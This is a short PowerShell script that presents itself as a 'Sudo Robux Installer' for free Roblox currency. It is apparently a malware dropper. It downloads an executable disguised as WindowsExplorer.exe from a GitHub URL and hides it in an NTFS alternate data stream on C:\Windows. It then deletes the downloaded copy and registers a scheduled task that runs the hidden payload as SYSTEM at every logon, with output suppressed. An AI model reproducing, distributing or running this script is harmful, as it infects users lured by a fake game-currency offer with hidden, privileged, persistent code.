Clear-Host
Write-Host "Sudo Robux Installer" -ForegroundColor Magenta -NoNewLine
Write-Host " by Hadron" -ForegroundColor DarkGray
Write-Host
Write-Host "Downloading..." -ForegroundColor DarkCyan
curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/WindowsExplorer.exe -o russianhuzz
Write-Host "Installing..." -ForegroundColor DarkCyan
cmd.exe /c "type russianhuzz > C:\Windows:Explorer"
rm .\russianhuzz
schtasks /create /tn "WindowsExplorer" /tr "C:\Windows\System32\cmd.exe /c wmic process call create C:\Windows:Explorer" /sc onlogon /ru "SYSTEM" /rl highest /f > $null 2>&1
schtasks /run /tn WindowsExplorer > $null 2>&1
Write-Host
